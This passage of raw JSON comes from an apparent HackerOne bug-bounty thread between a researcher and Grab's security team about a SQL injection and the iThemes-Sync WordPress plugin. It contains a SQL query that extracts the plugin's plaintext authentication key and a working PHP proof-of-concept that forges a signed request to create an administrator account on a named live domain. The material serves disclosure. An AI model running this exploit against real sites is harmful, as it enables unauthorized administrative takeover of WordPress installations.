the software developer? Currently all other users of the plugin are vulnerable. I asked about this a week ago in #272683.","markdown_message":"\u003cp\u003eAlso, do you object to me reporting these bugs to the software developer? Currently all other users of the plugin are vulnerable. I asked about this a week ago in \u003ca href=\"/reports/272683\"\u003e#272683\u003c/a\u003e.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-09T14:03:25.181Z","updated_at":"2017-10-09T14:03:25.181Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2055581,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @jouko\n\nFirst of all thank you for your remarks. We have investigated all your submissions to evaluate the impact as fairly as possible. In your report you did not demonstrate any way to pivot from the DB to system level. After our investigation we believe that pivoting was not possible in that context because of the following reasons :\n\n- Strong Password policy are enforce\n- Password Expiration are setup\n- All password are stored with a strong hash algorithm and salted.\n- The DB access was limited to read access only\n- The Wordpress instance is hardened with Sucuri Sec plugin \n\nAbout the iThemes-Sync authentication key there do not appear to be any security implications as a direct result of this key exposure. Did you have access to the key in plaintext? We would need to see specific evidence showing how that key can be use for performing any RCE.\n\nNote that we are involving hackerone team for evaluate your finding as fair as possible.\n\nWe appreciate your help in keeping Grab and our customers safe and secure.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eFirst of all thank you for your remarks. We have investigated all your submissions to evaluate the impact as fairly as possible. In your report you did not demonstrate any way to pivot from the DB to system level. After our investigation we believe that pivoting was not possible in that context because of the following reasons :\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eStrong Password policy are enforce\u003c/li\u003e\n\u003cli\u003ePassword Expiration are setup\u003c/li\u003e\n\u003cli\u003eAll password are stored with a strong hash algorithm and salted.\u003c/li\u003e\n\u003cli\u003eThe DB access was limited to read access only\u003c/li\u003e\n\u003cli\u003eThe Wordpress instance is hardened with Sucuri Sec plugin \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAbout the iThemes-Sync authentication key there do not appear to be any security implications as a direct result of this key exposure. Did you have access to the key in plaintext? We would need to see specific evidence showing how that key can be use for performing any RCE.\u003c/p\u003e\n\n\u003cp\u003eNote that we are involving hackerone team for evaluate your finding as fair as possible.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your help in keeping Grab and our customers safe and secure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-10T04:05:50.678Z","updated_at":"2017-10-10T04:05:50.678Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2055890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, iThemes sync stores the authentication key in plain text. It can be retrieved with the SQL query\n~~~~\nSELECT option_value FROM ██████ WHERE option_name='ithemes-sync-cache'\n~~~~\n\nYou (and the attacker) would get a PHP-serialized result such as\n~~~~\na:4:{s:15:\"authentications\";a:1:{i:123;a:4:{s:3:\"key\";s:10:\"(KEY HERE)\";s:9:\"timestamp\";i:1507622913;s:10:\"local_user\";s:4:\"test\";s:8:\"username\";s:4:\"test\"}}s:12:\"use_ca_patch\";b:0;s:9:\"show_sync\";b:1;s:7:\"use_ssl\";b:1;}\n~~~~\n\nThe iThemes-specific user id in this example is 123. The associated authentication key is \"(KEY HERE)\".\n\nThese two variables are all the attacker needs to gain access to the administrative functions. I made a script to demonstrate this. I was able to add a new administrator user on my test server by using only the user id and authentication key taken from the database.\n\n~~~~php\n\u003c?php\n\n// fill in these two, run from command line: php this_script.php\n$user_id='123';\n$key='(KEY HERE)';\n\n$action='manage-users';\n\n$newuser=array();\n$newuser[0]=array();\n$newuser[0][0]=array();\n$newuser[0][0]['user_login']='newuser';\n$newuser[0][0]['user_pass']='newpass';\n$newuser[0][0]['█████████']='foo@foo.com';\n$newuser[0][0]['role']='administrator';\n\n$args=array();\n$args['add']=$newuser;\n\n$salt='A';\n\n$hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt);\n\n$req=array();\n$req['action']=$action;\n$req['arguments']=$args;\n$req['user_id']=$user_id;\n$req['salt']=$salt;\n$req['hash']=$hash;\n\n$data='request='.json_encode($req);\necho(\"sending: $data\\n\");\n\n$c=curl_init();\ncurl_setopt($c, CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-request=1');\ncurl_setopt($c, CURLOPT_POSTFIELDS, $data);\n$res=curl_exec($c);\n\necho(\"response: \".json_encode($res).\"\\n\");\n\n?\u003e\n~~~~\n\nHandling of the iThemes-Sync request happens in ``wp-content/plugins/ithemes-sync/request-handler.php``.  Authenticating the request is done in function ``parse_request()`` in this way:\n\n~~~~php\n                $hash = hash( 'sha256', $request['user_id'] . $request['action'] . $this-\u003ejson_encode( $request['arguments'] ) . $user_data['key'] . $request['salt'] );\n                \n                if ( $hash !== $request['hash'] ) {\n                        $this-\u003esend_response( new WP_Error( 'hash-mismatch', 'The hash could not be validated as a correct hash.' ) );\n                }\n~~~~\nThe hash calculation is simply replicated in my exploit above. The \"salt\" variable can be freely chosen (in the example just 'A'). The only unknown variables are ``user_id`` and ``key`` which can be retrieved with the SQL injection.\n\nAdding a new user isn't probably the way a real attacker would do because it's easily detectable. The authentication key gives the attacker a lot of other possibilities. The plugin supports 43 other functions (\"verbs\") that can be used instead of ``manage-users`` any \"verbs\" , e.g. ``manage-plugins`` (to download, install, activate, deactivate, or uninstall plugins).  All the possible verbs are in the ``wp-content/plugins/ithemes-sync/verbs/`` directory.\n","markdown_message":"\u003cp\u003eYes, iThemes sync stores the authentication key in plain text. It can be retrieved with the SQL query\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eSELECT option_value FROM ██████ WHERE option_name=\u0026#39;ithemes-sync-cache\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou (and the attacker) would get a PHP-serialized result such as\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:4:{s:15:\u0026quot;authentications\u0026quot;;a:1:{i:123;a:4:{s:3:\u0026quot;key\u0026quot;;s:10:\u0026quot;(KEY HERE)\u0026quot;;s:9:\u0026quot;timestamp\u0026quot;;i:1507622913;s:10:\u0026quot;local_user\u0026quot;;s:4:\u0026quot;test\u0026quot;;s:8:\u0026quot;username\u0026quot;;s:4:\u0026quot;test\u0026quot;}}s:12:\u0026quot;use_ca_patch\u0026quot;;b:0;s:9:\u0026quot;show_sync\u0026quot;;b:1;s:7:\u0026quot;use_ssl\u0026quot;;b:1;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe iThemes-specific user id in this example is 123. The associated authentication key is \u0026quot;(KEY HERE)\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eThese two variables are all the attacker needs to gain access to the administrative functions. I made a script to demonstrate this. I was able to add a new administrator user on my test server by using only the user id and authentication key taken from the database.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// fill in these two, run from command line: php this_script.php\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;123\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;(KEY HERE)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;manage-users\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_login\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;newuser\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_pass\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;newpass\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;█████████\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;foo@foo.com\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;role\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;administrator\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;add\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sha256\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;action\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;arguments\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;salt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;request=\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;sending: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ecurl_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ecurl_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCURLOPT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://www.drivegrab.com/?ithemes-sync-request=1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ecurl_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCURLOPT_POSTFIELDS\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ecurl_exec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;response: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHandling of the iThemes-Sync request happens in \u003ccode\u003ewp-content/plugins/ithemes-sync/request-handler.php\u003c/code\u003e.  Authenticating the request is done in function \u003ccode\u003eparse_request()\u003c/code\u003e in this way:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e                \u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sha256\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;action\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;arguments\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$user_data\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;salt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003esend_response\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWP_Error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;hash-mismatch\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;The hash could not be validated as a correct hash.\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe hash calculation is simply replicated in my exploit above. The \u0026quot;salt\u0026quot; variable can be freely chosen (in the example just \u0026#39;A\u0026#39;). The only unknown variables are \u003ccode\u003euser_id\u003c/code\u003e and \u003ccode\u003ekey\u003c/code\u003e which can be retrieved with the SQL injection.\u003c/p\u003e\n\n\u003cp\u003eAdding a new user isn\u0026#39;t probably the way a real attacker would do because it\u0026#39;s easily detectable. The authentication key gives the attacker a lot of other possibilities. The plugin supports 43 other functions (\u0026quot;verbs\u0026quot;) that can be used instead of \u003ccode\u003emanage-users\u003c/code\u003e any \u0026quot;verbs\u0026quot; , e.g. \u003ccode\u003emanage-plugins\u003c/code\u003e (to download, install, activate, deactivate, or uninstall plugins).  All the possible verbs are in the \u003ccode\u003ewp-content/plugins/ithemes-sync/verbs/\u003c/code\u003e directory.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-10T09:30:30.466Z","updated_at":"2017-11-15T07:08:17.844Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2063383,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-13T06:10:13.289Z","updated_at":"2017-10-13T06:10:13.289Z","actor":{"url":"/grab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/659/d5a2e407a772cb09a7ef57167580acf021c9c407_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Grab"}},"bounty_amount":"4500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"grab","collaborator":{"username":"jouko","url":"/jouko"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2063391,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @Jouko,\n\nThank you again for your reply. We have rewarded your finding according to the data impacted, ease of exploit and overall risk to Grab customers, drivers and Grab.\nUnfortunately we did not consider possible to perform any code execution even with your additional information. We tried to reproduce your PoC against our systems but this one is not working mainly because of that environments are not totally similar and our instance is hardened.\n\nSince you had access to the DB and iThemes-Sync `user id`/`authentication key` you should be able to reproduce this RCE against our system. We would need to see specific evidence to reassess your bounty.\n\nWe appreciate your help in keeping Grab and our customer secure.\n","markdown_message":"\u003cp\u003eHello \u003ca href=\"/jouko\"\u003e@Jouko\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for your reply. We have rewarded your finding according to the data impacted, ease of exploit and overall risk to Grab customers, drivers and Grab.\u003cbr\u003e\nUnfortunately we did not consider possible to perform any code execution even with your additional information. We tried to reproduce your PoC against our systems but this one is not working mainly because of that environments are not totally similar and our instance is hardened.\u003c/p\u003e\n\n\u003cp\u003eSince you had access to the DB and iThemes-Sync \u003ccode\u003euser id\u003c/code\u003e/\u003ccode\u003eauthentication key\u003c/code\u003e you should be able to reproduce this RCE against our system. We would need to see specific evidence to reassess your bounty.\u003c/p\u003e\n\n\u003cp\u003eWe appreciate your help in keeping Grab and our customer secure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-13T06:15:22.529Z","updated_at":"2017-10-13T06:15:22.529Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2063406,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I didn't retrieve the authentication key. Retrieving data with a blind SQL injection puts a heavy load on the server and it seemed very slow already. Downloading sensitive data could be also viewed a violation of privacy so I limited my access to minimum.  Surely me trying to respect your privacy and ensure your servers stay operational shouldn't be a basis for dismissing vulnerabilities.\n\nIt can't be a matter of opinion whether the vulnerability exists or not. If it \"is not working\", maybe you could tell me how it is not working. Do you get an error message, or what happens?\n\nI can contact iThemes and ask them to confirm that their Sync plugin can be controlled with the plaintext key. If you give me the key and user id, I can try to reproduce it.\n","markdown_message":"\u003cp\u003eI didn\u0026#39;t retrieve the authentication key. Retrieving data with a blind SQL injection puts a heavy load on the server and it seemed very slow already. Downloading sensitive data could be also viewed a violation of privacy so I limited my access to minimum.  Surely me trying to respect your privacy and ensure your servers stay operational shouldn\u0026#39;t be a basis for dismissing 